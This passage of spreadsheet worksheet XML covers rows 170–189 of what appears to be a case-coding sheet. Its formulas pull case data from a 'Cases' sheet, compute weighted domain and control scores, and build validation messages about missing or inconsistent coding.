        <v/>
      </c>
      <c r="AN170" s="13">
        <f>IF(AND(AI170&lt;&gt;"",AM170=""),1,0)</f>
        <v/>
      </c>
      <c r="AO170" s="14" t="n"/>
    </row>
    <row r="171">
      <c r="A171" s="11">
        <f>Cases!A171</f>
        <v/>
      </c>
      <c r="B171" s="11">
        <f>Cases!B171</f>
        <v/>
      </c>
      <c r="C171" s="11">
        <f>Cases!C171</f>
        <v/>
      </c>
      <c r="D171" s="11">
        <f>IF(Cases!F171="",LEFT(Cases!G171,120),Cases!F171)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E171:L171)=0,"",SUM(E171:L171))</f>
        <v/>
      </c>
      <c r="AJ171" s="13">
        <f>IF(AI171="","",N(E171)*3+N(F171)*2+N(G171)*2+N(H171)*2+N(I171)*2+N(J171)*3+N(K171)*3+N(L171)*3)</f>
        <v/>
      </c>
      <c r="AK171" s="13">
        <f>IF(AI171="","",COUNTIF(N171:AG171,1))</f>
        <v/>
      </c>
      <c r="AL171" s="13">
        <f>IF(OR(AJ171="",AJ171=0),"",ROUND(100*(AJ171-AK171)/AJ171,1))</f>
        <v/>
      </c>
      <c r="AM171" s="11">
        <f>IF(AI171="","",IF(AI171=0,"No domain coded 1; ","")&amp;IF(M171="","Primary domain missing; ",IF(IFERROR(INDEX(E171:L171,1,M171),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N171:AG171)&lt;&gt;AJ171,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH171="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN171" s="13">
        <f>IF(AND(AI171&lt;&gt;"",AM171=""),1,0)</f>
        <v/>
      </c>
      <c r="AO171" s="14" t="n"/>
    </row>
    <row r="172">
      <c r="A172" s="11">
        <f>Cases!A172</f>
        <v/>
      </c>
      <c r="B172" s="11">
        <f>Cases!B172</f>
        <v/>
      </c>
      <c r="C172" s="11">
        <f>Cases!C172</f>
        <v/>
      </c>
      <c r="D172" s="11">
        <f>IF(Cases!F172="",LEFT(Cases!G172,120),Cases!F172)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E172:L172)=0,"",SUM(E172:L172))</f>
        <v/>
      </c>
      <c r="AJ172" s="13">
        <f>IF(AI172="","",N(E172)*3+N(F172)*2+N(G172)*2+N(H172)*2+N(I172)*2+N(J172)*3+N(K172)*3+N(L172)*3)</f>
        <v/>
      </c>
      <c r="AK172" s="13">
        <f>IF(AI172="","",COUNTIF(N172:AG172,1))</f>
        <v/>
      </c>
      <c r="AL172" s="13">
        <f>IF(OR(AJ172="",AJ172=0),"",ROUND(100*(AJ172-AK172)/AJ172,1))</f>
        <v/>
      </c>
      <c r="AM172" s="11">
        <f>IF(AI172="","",IF(AI172=0,"No domain coded 1; ","")&amp;IF(M172="","Primary domain missing; ",IF(IFERROR(INDEX(E172:L172,1,M172),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N172:AG172)&lt;&gt;AJ172,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH172="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN172" s="13">
        <f>IF(AND(AI172&lt;&gt;"",AM172=""),1,0)</f>
        <v/>
      </c>
      <c r="AO172" s="14" t="n"/>
    </row>
    <row r="173">
      <c r="A173" s="11">
        <f>Cases!A173</f>
        <v/>
      </c>
      <c r="B173" s="11">
        <f>Cases!B173</f>
        <v/>
      </c>
      <c r="C173" s="11">
        <f>Cases!C173</f>
        <v/>
      </c>
      <c r="D173" s="11">
        <f>IF(Cases!F173="",LEFT(Cases!G173,120),Cases!F173)</f>
        <v/>
      </c>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c r="AI173" s="13">
        <f>IF(COUNT(E173:L173)=0,"",SUM(E173:L173))</f>
        <v/>
      </c>
      <c r="AJ173" s="13">
        <f>IF(AI173="","",N(E173)*3+N(F173)*2+N(G173)*2+N(H173)*2+N(I173)*2+N(J173)*3+N(K173)*3+N(L173)*3)</f>
        <v/>
      </c>
      <c r="AK173" s="13">
        <f>IF(AI173="","",COUNTIF(N173:AG173,1))</f>
        <v/>
      </c>
      <c r="AL173" s="13">
        <f>IF(OR(AJ173="",AJ173=0),"",ROUND(100*(AJ173-AK173)/AJ173,1))</f>
        <v/>
      </c>
      <c r="AM173" s="11">
        <f>IF(AI173="","",IF(AI173=0,"No domain coded 1; ","")&amp;IF(M173="","Primary domain missing; ",IF(IFERROR(INDEX(E173:L173,1,M173),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N173:AG173)&lt;&gt;AJ173,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH173="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN173" s="13">
        <f>IF(AND(AI173&lt;&gt;"",AM173=""),1,0)</f>
        <v/>
      </c>
      <c r="AO173" s="14" t="n"/>
    </row>
    <row r="174">
      <c r="A174" s="11">
        <f>Cases!A174</f>
        <v/>
      </c>
      <c r="B174" s="11">
        <f>Cases!B174</f>
        <v/>
      </c>
      <c r="C174" s="11">
        <f>Cases!C174</f>
        <v/>
      </c>
      <c r="D174" s="11">
        <f>IF(Cases!F174="",LEFT(Cases!G174,120),Cases!F174)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E174:L174)=0,"",SUM(E174:L174))</f>
        <v/>
      </c>
      <c r="AJ174" s="13">
        <f>IF(AI174="","",N(E174)*3+N(F174)*2+N(G174)*2+N(H174)*2+N(I174)*2+N(J174)*3+N(K174)*3+N(L174)*3)</f>
        <v/>
      </c>
      <c r="AK174" s="13">
        <f>IF(AI174="","",COUNTIF(N174:AG174,1))</f>
        <v/>
      </c>
      <c r="AL174" s="13">
        <f>IF(OR(AJ174="",AJ174=0),"",ROUND(100*(AJ174-AK174)/AJ174,1))</f>
        <v/>
      </c>
      <c r="AM174" s="11">
        <f>IF(AI174="","",IF(AI174=0,"No domain coded 1; ","")&amp;IF(M174="","Primary domain missing; ",IF(IFERROR(INDEX(E174:L174,1,M174),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N174:AG174)&lt;&gt;AJ174,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH174="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN174" s="13">
        <f>IF(AND(AI174&lt;&gt;"",AM174=""),1,0)</f>
        <v/>
      </c>
      <c r="AO174" s="14" t="n"/>
    </row>
    <row r="175">
      <c r="A175" s="11">
        <f>Cases!A175</f>
        <v/>
      </c>
      <c r="B175" s="11">
        <f>Cases!B175</f>
        <v/>
      </c>
      <c r="C175" s="11">
        <f>Cases!C175</f>
        <v/>
      </c>
      <c r="D175" s="11">
        <f>IF(Cases!F175="",LEFT(Cases!G175,120),Cases!F175)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E175:L175)=0,"",SUM(E175:L175))</f>
        <v/>
      </c>
      <c r="AJ175" s="13">
        <f>IF(AI175="","",N(E175)*3+N(F175)*2+N(G175)*2+N(H175)*2+N(I175)*2+N(J175)*3+N(K175)*3+N(L175)*3)</f>
        <v/>
      </c>
      <c r="AK175" s="13">
        <f>IF(AI175="","",COUNTIF(N175:AG175,1))</f>
        <v/>
      </c>
      <c r="AL175" s="13">
        <f>IF(OR(AJ175="",AJ175=0),"",ROUND(100*(AJ175-AK175)/AJ175,1))</f>
        <v/>
      </c>
      <c r="AM175" s="11">
        <f>IF(AI175="","",IF(AI175=0,"No domain coded 1; ","")&amp;IF(M175="","Primary domain missing; ",IF(IFERROR(INDEX(E175:L175,1,M175),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N175:AG175)&lt;&gt;AJ175,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH175="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN175" s="13">
        <f>IF(AND(AI175&lt;&gt;"",AM175=""),1,0)</f>
        <v/>
      </c>
      <c r="AO175" s="14" t="n"/>
    </row>
    <row r="176">
      <c r="A176" s="11">
        <f>Cases!A176</f>
        <v/>
      </c>
      <c r="B176" s="11">
        <f>Cases!B176</f>
        <v/>
      </c>
      <c r="C176" s="11">
        <f>Cases!C176</f>
        <v/>
      </c>
      <c r="D176" s="11">
        <f>IF(Cases!F176="",LEFT(Cases!G176,120),Cases!F176)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E176:L176)=0,"",SUM(E176:L176))</f>
        <v/>
      </c>
      <c r="AJ176" s="13">
        <f>IF(AI176="","",N(E176)*3+N(F176)*2+N(G176)*2+N(H176)*2+N(I176)*2+N(J176)*3+N(K176)*3+N(L176)*3)</f>
        <v/>
      </c>
      <c r="AK176" s="13">
        <f>IF(AI176="","",COUNTIF(N176:AG176,1))</f>
        <v/>
      </c>
      <c r="AL176" s="13">
        <f>IF(OR(AJ176="",AJ176=0),"",ROUND(100*(AJ176-AK176)/AJ176,1))</f>
        <v/>
      </c>
      <c r="AM176" s="11">
        <f>IF(AI176="","",IF(AI176=0,"No domain coded 1; ","")&amp;IF(M176="","Primary domain missing; ",IF(IFERROR(INDEX(E176:L176,1,M176),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N176:AG176)&lt;&gt;AJ176,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH176="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN176" s="13">
        <f>IF(AND(AI176&lt;&gt;"",AM176=""),1,0)</f>
        <v/>
      </c>
      <c r="AO176" s="14" t="n"/>
    </row>
    <row r="177">
      <c r="A177" s="11">
        <f>Cases!A177</f>
        <v/>
      </c>
      <c r="B177" s="11">
        <f>Cases!B177</f>
        <v/>
      </c>
      <c r="C177" s="11">
        <f>Cases!C177</f>
        <v/>
      </c>
      <c r="D177" s="11">
        <f>IF(Cases!F177="",LEFT(Cases!G177,120),Cases!F177)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E177:L177)=0,"",SUM(E177:L177))</f>
        <v/>
      </c>
      <c r="AJ177" s="13">
        <f>IF(AI177="","",N(E177)*3+N(F177)*2+N(G177)*2+N(H177)*2+N(I177)*2+N(J177)*3+N(K177)*3+N(L177)*3)</f>
        <v/>
      </c>
      <c r="AK177" s="13">
        <f>IF(AI177="","",COUNTIF(N177:AG177,1))</f>
        <v/>
      </c>
      <c r="AL177" s="13">
        <f>IF(OR(AJ177="",AJ177=0),"",ROUND(100*(AJ177-AK177)/AJ177,1))</f>
        <v/>
      </c>
      <c r="AM177" s="11">
        <f>IF(AI177="","",IF(AI177=0,"No domain coded 1; ","")&amp;IF(M177="","Primary domain missing; ",IF(IFERROR(INDEX(E177:L177,1,M177),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N177:AG177)&lt;&gt;AJ177,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH177="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN177" s="13">
        <f>IF(AND(AI177&lt;&gt;"",AM177=""),1,0)</f>
        <v/>
      </c>
      <c r="AO177" s="14" t="n"/>
    </row>
    <row r="178">
      <c r="A178" s="11">
        <f>Cases!A178</f>
        <v/>
      </c>
      <c r="B178" s="11">
        <f>Cases!B178</f>
        <v/>
      </c>
      <c r="C178" s="11">
        <f>Cases!C178</f>
        <v/>
      </c>
      <c r="D178" s="11">
        <f>IF(Cases!F178="",LEFT(Cases!G178,120),Cases!F178)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E178:L178)=0,"",SUM(E178:L178))</f>
        <v/>
      </c>
      <c r="AJ178" s="13">
        <f>IF(AI178="","",N(E178)*3+N(F178)*2+N(G178)*2+N(H178)*2+N(I178)*2+N(J178)*3+N(K178)*3+N(L178)*3)</f>
        <v/>
      </c>
      <c r="AK178" s="13">
        <f>IF(AI178="","",COUNTIF(N178:AG178,1))</f>
        <v/>
      </c>
      <c r="AL178" s="13">
        <f>IF(OR(AJ178="",AJ178=0),"",ROUND(100*(AJ178-AK178)/AJ178,1))</f>
        <v/>
      </c>
      <c r="AM178" s="11">
        <f>IF(AI178="","",IF(AI178=0,"No domain coded 1; ","")&amp;IF(M178="","Primary domain missing; ",IF(IFERROR(INDEX(E178:L178,1,M178),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N178:AG178)&lt;&gt;AJ178,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH178="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN178" s="13">
        <f>IF(AND(AI178&lt;&gt;"",AM178=""),1,0)</f>
        <v/>
      </c>
      <c r="AO178" s="14" t="n"/>
    </row>
    <row r="179">
      <c r="A179" s="11">
        <f>Cases!A179</f>
        <v/>
      </c>
      <c r="B179" s="11">
        <f>Cases!B179</f>
        <v/>
      </c>
      <c r="C179" s="11">
        <f>Cases!C179</f>
        <v/>
      </c>
      <c r="D179" s="11">
        <f>IF(Cases!F179="",LEFT(Cases!G179,120),Cases!F179)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E179:L179)=0,"",SUM(E179:L179))</f>
        <v/>
      </c>
      <c r="AJ179" s="13">
        <f>IF(AI179="","",N(E179)*3+N(F179)*2+N(G179)*2+N(H179)*2+N(I179)*2+N(J179)*3+N(K179)*3+N(L179)*3)</f>
        <v/>
      </c>
      <c r="AK179" s="13">
        <f>IF(AI179="","",COUNTIF(N179:AG179,1))</f>
        <v/>
      </c>
      <c r="AL179" s="13">
        <f>IF(OR(AJ179="",AJ179=0),"",ROUND(100*(AJ179-AK179)/AJ179,1))</f>
        <v/>
      </c>
      <c r="AM179" s="11">
        <f>IF(AI179="","",IF(AI179=0,"No domain coded 1; ","")&amp;IF(M179="","Primary domain missing; ",IF(IFERROR(INDEX(E179:L179,1,M179),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N179:AG179)&lt;&gt;AJ179,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH179="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN179" s="13">
        <f>IF(AND(AI179&lt;&gt;"",AM179=""),1,0)</f>
        <v/>
      </c>
      <c r="AO179" s="14" t="n"/>
    </row>
    <row r="180">
      <c r="A180" s="11">
        <f>Cases!A180</f>
        <v/>
      </c>
      <c r="B180" s="11">
        <f>Cases!B180</f>
        <v/>
      </c>
      <c r="C180" s="11">
        <f>Cases!C180</f>
        <v/>
      </c>
      <c r="D180" s="11">
        <f>IF(Cases!F180="",LEFT(Cases!G180,120),Cases!F180)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E180:L180)=0,"",SUM(E180:L180))</f>
        <v/>
      </c>
      <c r="AJ180" s="13">
        <f>IF(AI180="","",N(E180)*3+N(F180)*2+N(G180)*2+N(H180)*2+N(I180)*2+N(J180)*3+N(K180)*3+N(L180)*3)</f>
        <v/>
      </c>
      <c r="AK180" s="13">
        <f>IF(AI180="","",COUNTIF(N180:AG180,1))</f>
        <v/>
      </c>
      <c r="AL180" s="13">
        <f>IF(OR(AJ180="",AJ180=0),"",ROUND(100*(AJ180-AK180)/AJ180,1))</f>
        <v/>
      </c>
      <c r="AM180" s="11">
        <f>IF(AI180="","",IF(AI180=0,"No domain coded 1; ","")&amp;IF(M180="","Primary domain missing; ",IF(IFERROR(INDEX(E180:L180,1,M180),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N180:AG180)&lt;&gt;AJ180,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH180="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN180" s="13">
        <f>IF(AND(AI180&lt;&gt;"",AM180=""),1,0)</f>
        <v/>
      </c>
      <c r="AO180" s="14" t="n"/>
    </row>
    <row r="181">
      <c r="A181" s="11">
        <f>Cases!A181</f>
        <v/>
      </c>
      <c r="B181" s="11">
        <f>Cases!B181</f>
        <v/>
      </c>
      <c r="C181" s="11">
        <f>Cases!C181</f>
        <v/>
      </c>
      <c r="D181" s="11">
        <f>IF(Cases!F181="",LEFT(Cases!G181,120),Cases!F181)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E181:L181)=0,"",SUM(E181:L181))</f>
        <v/>
      </c>
      <c r="AJ181" s="13">
        <f>IF(AI181="","",N(E181)*3+N(F181)*2+N(G181)*2+N(H181)*2+N(I181)*2+N(J181)*3+N(K181)*3+N(L181)*3)</f>
        <v/>
      </c>
      <c r="AK181" s="13">
        <f>IF(AI181="","",COUNTIF(N181:AG181,1))</f>
        <v/>
      </c>
      <c r="AL181" s="13">
        <f>IF(OR(AJ181="",AJ181=0),"",ROUND(100*(AJ181-AK181)/AJ181,1))</f>
        <v/>
      </c>
      <c r="AM181" s="11">
        <f>IF(AI181="","",IF(AI181=0,"No domain coded 1; ","")&amp;IF(M181="","Primary domain missing; ",IF(IFERROR(INDEX(E181:L181,1,M181),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N181:AG181)&lt;&gt;AJ181,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH181="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN181" s="13">
        <f>IF(AND(AI181&lt;&gt;"",AM181=""),1,0)</f>
        <v/>
      </c>
      <c r="AO181" s="14" t="n"/>
    </row>
    <row r="182">
      <c r="A182" s="11">
        <f>Cases!A182</f>
        <v/>
      </c>
      <c r="B182" s="11">
        <f>Cases!B182</f>
        <v/>
      </c>
      <c r="C182" s="11">
        <f>Cases!C182</f>
        <v/>
      </c>
      <c r="D182" s="11">
        <f>IF(Cases!F182="",LEFT(Cases!G182,120),Cases!F182)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E182:L182)=0,"",SUM(E182:L182))</f>
        <v/>
      </c>
      <c r="AJ182" s="13">
        <f>IF(AI182="","",N(E182)*3+N(F182)*2+N(G182)*2+N(H182)*2+N(I182)*2+N(J182)*3+N(K182)*3+N(L182)*3)</f>
        <v/>
      </c>
      <c r="AK182" s="13">
        <f>IF(AI182="","",COUNTIF(N182:AG182,1))</f>
        <v/>
      </c>
      <c r="AL182" s="13">
        <f>IF(OR(AJ182="",AJ182=0),"",ROUND(100*(AJ182-AK182)/AJ182,1))</f>
        <v/>
      </c>
      <c r="AM182" s="11">
        <f>IF(AI182="","",IF(AI182=0,"No domain coded 1; ","")&amp;IF(M182="","Primary domain missing; ",IF(IFERROR(INDEX(E182:L182,1,M182),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N182:AG182)&lt;&gt;AJ182,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH182="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN182" s="13">
        <f>IF(AND(AI182&lt;&gt;"",AM182=""),1,0)</f>
        <v/>
      </c>
      <c r="AO182" s="14" t="n"/>
    </row>
    <row r="183">
      <c r="A183" s="11">
        <f>Cases!A183</f>
        <v/>
      </c>
      <c r="B183" s="11">
        <f>Cases!B183</f>
        <v/>
      </c>
      <c r="C183" s="11">
        <f>Cases!C183</f>
        <v/>
      </c>
      <c r="D183" s="11">
        <f>IF(Cases!F183="",LEFT(Cases!G183,120),Cases!F183)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E183:L183)=0,"",SUM(E183:L183))</f>
        <v/>
      </c>
      <c r="AJ183" s="13">
        <f>IF(AI183="","",N(E183)*3+N(F183)*2+N(G183)*2+N(H183)*2+N(I183)*2+N(J183)*3+N(K183)*3+N(L183)*3)</f>
        <v/>
      </c>
      <c r="AK183" s="13">
        <f>IF(AI183="","",COUNTIF(N183:AG183,1))</f>
        <v/>
      </c>
      <c r="AL183" s="13">
        <f>IF(OR(AJ183="",AJ183=0),"",ROUND(100*(AJ183-AK183)/AJ183,1))</f>
        <v/>
      </c>
      <c r="AM183" s="11">
        <f>IF(AI183="","",IF(AI183=0,"No domain coded 1; ","")&amp;IF(M183="","Primary domain missing; ",IF(IFERROR(INDEX(E183:L183,1,M183),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N183:AG183)&lt;&gt;AJ183,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH183="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN183" s="13">
        <f>IF(AND(AI183&lt;&gt;"",AM183=""),1,0)</f>
        <v/>
      </c>
      <c r="AO183" s="14" t="n"/>
    </row>
    <row r="184">
      <c r="A184" s="11">
        <f>Cases!A184</f>
        <v/>
      </c>
      <c r="B184" s="11">
        <f>Cases!B184</f>
        <v/>
      </c>
      <c r="C184" s="11">
        <f>Cases!C184</f>
        <v/>
      </c>
      <c r="D184" s="11">
        <f>IF(Cases!F184="",LEFT(Cases!G184,120),Cases!F184)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E184:L184)=0,"",SUM(E184:L184))</f>
        <v/>
      </c>
      <c r="AJ184" s="13">
        <f>IF(AI184="","",N(E184)*3+N(F184)*2+N(G184)*2+N(H184)*2+N(I184)*2+N(J184)*3+N(K184)*3+N(L184)*3)</f>
        <v/>
      </c>
      <c r="AK184" s="13">
        <f>IF(AI184="","",COUNTIF(N184:AG184,1))</f>
        <v/>
      </c>
      <c r="AL184" s="13">
        <f>IF(OR(AJ184="",AJ184=0),"",ROUND(100*(AJ184-AK184)/AJ184,1))</f>
        <v/>
      </c>
      <c r="AM184" s="11">
        <f>IF(AI184="","",IF(AI184=0,"No domain coded 1; ","")&amp;IF(M184="","Primary domain missing; ",IF(IFERROR(INDEX(E184:L184,1,M184),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N184:AG184)&lt;&gt;AJ184,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH184="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN184" s="13">
        <f>IF(AND(AI184&lt;&gt;"",AM184=""),1,0)</f>
        <v/>
      </c>
      <c r="AO184" s="14" t="n"/>
    </row>
    <row r="185">
      <c r="A185" s="11">
        <f>Cases!A185</f>
        <v/>
      </c>
      <c r="B185" s="11">
        <f>Cases!B185</f>
        <v/>
      </c>
      <c r="C185" s="11">
        <f>Cases!C185</f>
        <v/>
      </c>
      <c r="D185" s="11">
        <f>IF(Cases!F185="",LEFT(Cases!G185,120),Cases!F185)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E185:L185)=0,"",SUM(E185:L185))</f>
        <v/>
      </c>
      <c r="AJ185" s="13">
        <f>IF(AI185="","",N(E185)*3+N(F185)*2+N(G185)*2+N(H185)*2+N(I185)*2+N(J185)*3+N(K185)*3+N(L185)*3)</f>
        <v/>
      </c>
      <c r="AK185" s="13">
        <f>IF(AI185="","",COUNTIF(N185:AG185,1))</f>
        <v/>
      </c>
      <c r="AL185" s="13">
        <f>IF(OR(AJ185="",AJ185=0),"",ROUND(100*(AJ185-AK185)/AJ185,1))</f>
        <v/>
      </c>
      <c r="AM185" s="11">
        <f>IF(AI185="","",IF(AI185=0,"No domain coded 1; ","")&amp;IF(M185="","Primary domain missing; ",IF(IFERROR(INDEX(E185:L185,1,M185),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N185:AG185)&lt;&gt;AJ185,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH185="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN185" s="13">
        <f>IF(AND(AI185&lt;&gt;"",AM185=""),1,0)</f>
        <v/>
      </c>
      <c r="AO185" s="14" t="n"/>
    </row>
    <row r="186">
      <c r="A186" s="11">
        <f>Cases!A186</f>
        <v/>
      </c>
      <c r="B186" s="11">
        <f>Cases!B186</f>
        <v/>
      </c>
      <c r="C186" s="11">
        <f>Cases!C186</f>
        <v/>
      </c>
      <c r="D186" s="11">
        <f>IF(Cases!F186="",LEFT(Cases!G186,120),Cases!F186)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E186:L186)=0,"",SUM(E186:L186))</f>
        <v/>
      </c>
      <c r="AJ186" s="13">
        <f>IF(AI186="","",N(E186)*3+N(F186)*2+N(G186)*2+N(H186)*2+N(I186)*2+N(J186)*3+N(K186)*3+N(L186)*3)</f>
        <v/>
      </c>
      <c r="AK186" s="13">
        <f>IF(AI186="","",COUNTIF(N186:AG186,1))</f>
        <v/>
      </c>
      <c r="AL186" s="13">
        <f>IF(OR(AJ186="",AJ186=0),"",ROUND(100*(AJ186-AK186)/AJ186,1))</f>
        <v/>
      </c>
      <c r="AM186" s="11">
        <f>IF(AI186="","",IF(AI186=0,"No domain coded 1; ","")&amp;IF(M186="","Primary domain missing; ",IF(IFERROR(INDEX(E186:L186,1,M186),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N186:AG186)&lt;&gt;AJ186,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH186="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN186" s="13">
        <f>IF(AND(AI186&lt;&gt;"",AM186=""),1,0)</f>
        <v/>
      </c>
      <c r="AO186" s="14" t="n"/>
    </row>
    <row r="187">
      <c r="A187" s="11">
        <f>Cases!A187</f>
        <v/>
      </c>
      <c r="B187" s="11">
        <f>Cases!B187</f>
        <v/>
      </c>
      <c r="C187" s="11">
        <f>Cases!C187</f>
        <v/>
      </c>
      <c r="D187" s="11">
        <f>IF(Cases!F187="",LEFT(Cases!G187,120),Cases!F187)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E187:L187)=0,"",SUM(E187:L187))</f>
        <v/>
      </c>
      <c r="AJ187" s="13">
        <f>IF(AI187="","",N(E187)*3+N(F187)*2+N(G187)*2+N(H187)*2+N(I187)*2+N(J187)*3+N(K187)*3+N(L187)*3)</f>
        <v/>
      </c>
      <c r="AK187" s="13">
        <f>IF(AI187="","",COUNTIF(N187:AG187,1))</f>
        <v/>
      </c>
      <c r="AL187" s="13">
        <f>IF(OR(AJ187="",AJ187=0),"",ROUND(100*(AJ187-AK187)/AJ187,1))</f>
        <v/>
      </c>
      <c r="AM187" s="11">
        <f>IF(AI187="","",IF(AI187=0,"No domain coded 1; ","")&amp;IF(M187="","Primary domain missing; ",IF(IFERROR(INDEX(E187:L187,1,M187),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N187:AG187)&lt;&gt;AJ187,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH187="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN187" s="13">
        <f>IF(AND(AI187&lt;&gt;"",AM187=""),1,0)</f>
        <v/>
      </c>
      <c r="AO187" s="14" t="n"/>
    </row>
    <row r="188">
      <c r="A188" s="11">
        <f>Cases!A188</f>
        <v/>
      </c>
      <c r="B188" s="11">
        <f>Cases!B188</f>
        <v/>
      </c>
      <c r="C188" s="11">
        <f>Cases!C188</f>
        <v/>
      </c>
      <c r="D188" s="11">
        <f>IF(Cases!F188="",LEFT(Cases!G188,120),Cases!F188)</f>
        <v/>
      </c>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c r="AI188" s="13">
        <f>IF(COUNT(E188:L188)=0,"",SUM(E188:L188))</f>
        <v/>
      </c>
      <c r="AJ188" s="13">
        <f>IF(AI188="","",N(E188)*3+N(F188)*2+N(G188)*2+N(H188)*2+N(I188)*2+N(J188)*3+N(K188)*3+N(L188)*3)</f>
        <v/>
      </c>
      <c r="AK188" s="13">
        <f>IF(AI188="","",COUNTIF(N188:AG188,1))</f>
        <v/>
      </c>
      <c r="AL188" s="13">
        <f>IF(OR(AJ188="",AJ188=0),"",ROUND(100*(AJ188-AK188)/AJ188,1))</f>
        <v/>
      </c>
      <c r="AM188" s="11">
        <f>IF(AI188="","",IF(AI188=0,"No domain coded 1; ","")&amp;IF(M188="","Primary domain missing; ",IF(IFERROR(INDEX(E188:L188,1,M188),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N188:AG188)&lt;&gt;AJ188,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH188="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN188" s="13">
        <f>IF(AND(AI188&lt;&gt;"",AM188=""),1,0)</f>
        <v/>
      </c>
      <c r="AO188" s="14" t="n"/>
    </row>
    <row r="189">
      <c r="A189" s="11">
        <f>Cases!A189</f>
        <v/>
      </c>
      <c r="B189" s="11">
        <f>Cases!B189</f>
        <v/>
      </c>
      <c r="C189" s="11">
        <f>Cases!C189</f>
        <v/>
      </c>
      <c r="D189" s="11">
        <f>IF(Cases!F189="",LEFT(Cases!G189,120),Cases!F189)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E189:L189)=0,"",SUM(E189:L189))</f>
        <v/>
      </c>
      <c r="AJ189" s="13">
        <f>IF(AI189="","",N(E189)*3+N(F189)*2+N(G189)*2+N(H189)*2+N(I189)*2+N(J189)*3+N(K189)*3+N(L189)*3)</f>
        <v/>
      </c>
      <c r="AK189" s="13">
        <f>IF(AI189="","",COUNTIF(N189:AG189,1))</f>
        <v/>
      </c>
      <c r="AL189" s="13">
        <f>IF(OR(AJ189="",AJ189=0),"",ROUND(100*(AJ189-AK189)/AJ189,1))</f>
        <v/>
      </c>
      <c r="AM189" s="11">
